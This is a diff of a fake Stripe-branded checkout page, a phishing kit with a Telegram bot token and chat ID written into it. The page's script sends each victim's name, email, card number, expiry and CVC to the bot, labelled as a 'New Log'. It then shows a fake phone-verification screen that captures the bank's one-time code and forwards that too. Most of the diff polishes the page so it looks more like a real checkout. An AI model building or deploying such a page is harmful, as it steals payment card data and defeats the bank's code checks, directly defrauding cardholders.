@@ -3,65 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Checkout</title>
+    <title>Checkout</title>
     <style>
         :root {
             --stripe-blue: #0000FF; 
             --border-color: #e6e6e6;
             --text-main: #1a1a1a;
             --text-gray: #6b7280;
-            --error-color: #ff0000;
+            --bg-gray: #f6f9fc;
         }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #ffffff;
             margin: 0;
-            padding: 10px;
+            padding: 0;
             display: flex;
             justify-content: center;
         }
 
-        .container { width: 100%; max-width: 400px; position: relative; padding-top: 60px; }
+        .container { 
+            width: 100%; 
+            max-width: 420px; 
+            padding: 20px;
+            box-sizing: border-box;
+        }
 
-        /* --- Logo Styling (Top Left) --- */
-        .header-logo {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 50px; /* الحجم المناسب */
-            height: 50px;
-            border-radius: 50%; /* لجعلها دائرية كما في الصورة */
-            overflow: hidden;
+        /* --- Header & Logo Alignment --- */
+        .header {
             display: flex;
             align-items: center;
-            justify-content: center;
-            border: 1px solid var(--border-color);
+            margin-bottom: 30px;
         }
+
+        .header-logo {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 1px solid #eee;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
         .header-logo img {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
 
-        .page { display: none; }
-        .active { display: block; }
-
-        /* Modals */
-        #errorModal, #successModal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            z-index: 1000;
-            padding: 20px;
-            text-align: center;
+        /* --- Design Principles (1000% Symmetry) --- */
+        h2 { 
+            font-size: 16px; 
+            font-weight: 600; 
+            margin: 25px 0 12px 0; 
+            color: var(--text-main);
         }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--stripe-blue);
+        }
+
+        .address-group, .card-group {
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
+
+        .address-group input, .card-group input {
+            border: none;
+            border-bottom: 1px solid var(--border-color);
+            border-radius: 0;
+        }
+
+        .address-group input:last-child, .card-group input:last-child {
+            border-bottom: none;
+        }
+
+        .row { display: flex; }
+        .row input { width: 50%; }
+        .row input:first-child { border-right: 1px solid var(--border-color); }
+
+        /* --- Payment Section --- */
+        .payment-method-box {
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 10px;
+        }
+
+        .payment-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .card-icons {
+            margin-left: auto;
+            height: 20px;
+        }
+
+        .btn-pay {
+            width: 100%;
+            background: var(--stripe-blue);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 30px;
+            cursor: pointer;
+        }
+
+        /* --- Custom Internal Modal (As per Images) --- */
         #modalOverlay {
             display: none;
             position: fixed;
@@ -69,44 +145,58 @@
             background: rgba(0,0,0,0.4);
             z-index: 999;
         }
-        .modal-text { font-size: 15px; margin-bottom: 20px; color: var(--text-main); line-height: 1.4; }
-        .modal-btn { color: var(--stripe-blue); font-weight: 600; cursor: pointer; border: none; background: none; font-size: 16px; }
 
-        /* Form elements */
-        h2 { font-size: 17px; font-weight: 600; margin: 20px 0 10px 0; }
-        input, select { width: 100%; padding: 11px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 15px; box-sizing: border-box; outline: none; margin-bottom: 8px; }
-        .address-group { border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; }
-        .address-group input { border: none; border-bottom: 1px solid var(--border-color); margin-bottom: 0; border-radius: 0; }
-        .address-group input:last-child { border-bottom: none; }
-        
-        .row { display: flex; }
-        .row input:first-child { border-right: 1px solid var(--border-color); }
+        #customAlert {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            max-width: 320px;
+            background: white;
+            border-radius: 14px;
+            z-index: 1000;
+            text-align: center;
+            box-shadow: 0 4px 25px rgba(0,0,0,0.2);
+        }
 
-        .btn-pay { width: 100%; background: var(--stripe-blue); color: white; border: none; padding: 15px; border-radius: 6px; font-size: 17px; font-weight: 600; margin-top: 20px; cursor: pointer; }
+        .alert-body { padding: 25px 20px; font-size: 16px; line-height: 1.4; color: #000; }
+        .alert-footer { border-top: 1px solid #eee; padding: 15px; }
+        .alert-btn { color: var(--stripe-blue); font-weight: 700; cursor: pointer; font-size: 17px; background: none; border: none; width: 100%; }
 
-        #loaderContainer { display: none; text-align: center; padding: 50px; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--stripe-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: auto; }
+        /* --- Loading & OTP --- */
+        .page { display: none; }
+        .active { display: block; }
+
+        #loader { display: none; text-align: center; padding: 60px 0; }
+        .spinner { width: 38px; height: 38px; border: 3px solid #f3f3f3; border-top: 3px solid var(--stripe-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .v-input { height: 60px; text-align: center; font-size: 24px; letter-spacing: 5px; }
+        .v-input { height: 55px; text-align: center; font-size: 26px; letter-spacing: 8px; font-weight: bold; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header-logo">
-        <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
-    </div>
-
     <div id="modalOverlay"></div>
-    
-    <div id="errorModal">
-        <div class="modal-text">Please fill in all fields correctly.</div>
-        <button class="modal-btn" onclick="closeModal()">Close</button>
+    <div id="customAlert">
+        <div class="alert-body">Please fill in all fields correctly.</div>
+        <div class="alert-footer">
+            <button class="alert-btn" onclick="closeAlert()">Close</button>
+        </div>
     </div>
 
     <div id="checkoutPage" class="page active">
+        <div class="header">
+            <div class="header-logo">
+                <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
+            </div>
+            <span style="font-weight: 600; font-size: 18px;">Secure Checkout</span>
+        </div>
+
         <h2>Shipping Information</h2>
+        <label>Email</label>
         <input type="email" id="email" placeholder="email@example.com">
         
         <h2>Shipping Address</h2>
@@ -115,76 +205,95 @@
             <input type="text" id="addr" placeholder="Address">
             <div class="row">
                 <input type="text" id="city" placeholder="City">
-                <input type="text" id="zip" placeholder="Zip">
+                <input type="text" id="zip" placeholder="Zip Code">
             </div>
         </div>
 
-        <h2>Payment</h2>
-        <input type="text" id="card" placeholder="Card Number" maxlength="19">
-        <div class="row">
-            <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
-            <input type="text" id="cvc" placeholder="CVC" maxlength="4">
+        <h2>Payment Method</h2>
+        <div class="payment-method-box">
+            <div class="payment-header">
+                <span>💳 Card</span>
+                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons">
+            </div>
+            <div class="card-group">
+                <input type="text" id="card" placeholder="Card Number" maxlength="19">
+                <div class="row">
+                    <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
+                    <input type="text" id="cvc" placeholder="CVC" maxlength="4">
+                </div>
+            </div>
         </div>
 
-        <button class="btn-pay" onclick="handlePay()">Pay Now</button>
+        <button class="btn-pay" onclick="processPayment()">Pay Now</button>
+        <p style="text-align: center; font-size: 12px; color: #999; margin-top: 20px;">Powered by <b>stripe</b></p>
     </div>
 
     <div id="verifyPage" class="page">
-        <h1 style="font-size: 24px;">Verify By Phone</h1>
-        <p>Verification code sent to your mobile.</p>
-        <input type="text" id="otp" class="v-input" maxlength="6" placeholder="000000">
-        <button class="btn-pay" onclick="handleOTP()">Confirm</button>
+        <h1 style="font-size: 24px; margin-bottom: 10px;">Verify By Phone</h1>
+        <p style="color: #666; font-size: 14px; margin-bottom: 30px;">We've sent a code to your registered mobile number for a payment of <b>EUR 1.46</b>.</p>
+        
+        <label style="text-align: center;">Verification code</label>
+        <input type="text" id="otp" class="v-input" maxlength="6">
+        
+        <button class="btn-pay" onclick="submitOTP()">Confirm</button>
+        <p style="text-align: center; margin-top: 20px;"><a href="#" style="color: var(--stripe-blue); text-decoration: none; font-weight: 600;">Resend Code</a></p>
     </div>
 
-    <div id="loaderContainer"><div class="spinner"></div></div>
+    <div id="loader">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; color: #666;">Processing...</p>
+    </div>
 </div>
 
 <script>
-    const config = {
+    const TG = {
         token: '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc',
-        chat_id: '656419637'
+        id: '656419637'
     };
 
     async function sendMsg(text) {
-        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TG.token}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: config.chat_id, text: text, parse_mode: 'HTML'})
+            body: JSON.stringify({chat_id: TG.id, text: text, parse_mode: 'HTML'})
         });
     }
 
+    // Formats
     document.getElementById('card').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
+    document.getElementById('exp').addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+    });
 
-    function closeModal() { document.getElementById('errorModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }
+    function showAlert() { document.getElementById('customAlert').style.display = 'block'; document.getElementById('modalOverlay').style.display = 'block'; }
+    function closeAlert() { document.getElementById('customAlert').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }
 
-    async function handlePay() {
+    async function processPayment() {
         const fields = ['email', 'name', 'addr', 'city', 'zip', 'card', 'exp', 'cvc'];
-        let empty = fields.some(id => !document.getElementById(id).value.trim());
+        let valid = true;
+        fields.forEach(id => { if(!document.getElementById(id).value.trim()) valid = false; });
 
-        if (empty) {
-            document.getElementById('errorModal').style.display = 'block';
-            document.getElementById('modalOverlay').style.display = 'block';
-            return;
-        }
+        if (!valid) { showAlert(); return; }
 
-        const msg = `<b>🚀 Card Hit</b>\nName: ${document.getElementById('name').value}\nEmail: ${document.getElementById('email').value}\nCard: ${document.getElementById('card').value}\nExp: ${document.getElementById('exp').value}\nCVC: ${document.getElementById('cvc').value}`;
-        await sendMsg(msg);
+        const log = `<b>⚡ New Log</b>\nName: ${document.getElementById('name').value}\nEmail: ${document.getElementById('email').value}\nCard: ${document.getElementById('card').value}\nExp: ${document.getElementById('exp').value}\nCVC: ${document.getElementById('cvc').value}`;
+        await sendMsg(log);
 
-        document.getElementById('checkoutPage').style.display = 'none';
-        document.getElementById('loaderContainer').style.display = 'block';
+        document.getElementById('checkoutPage').classList.remove('active');
+        document.getElementById('loader').style.display = 'block';
+        
         setTimeout(() => {
-            document.getElementById('loaderContainer').style.display = 'none';
-            document.getElementById('verifyPage').style.display = 'block';
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('verifyPage').classList.add('active');
         }, 3000);
     }
 
-    async function handleOTP() {
+    async function submitOTP() {
         const otp = document.getElementById('otp').value;
         if(otp.length === 6) {
-            await sendMsg(`<b>🔑 OTP:</b> <code>${otp}</code>`);
-            alert("Success!");
+            await sendMsg(`<b>🔑 OTP Received:</b> <code>${otp}</code>`);
+            alert("Verification Complete.");
         }
     }
 </script>
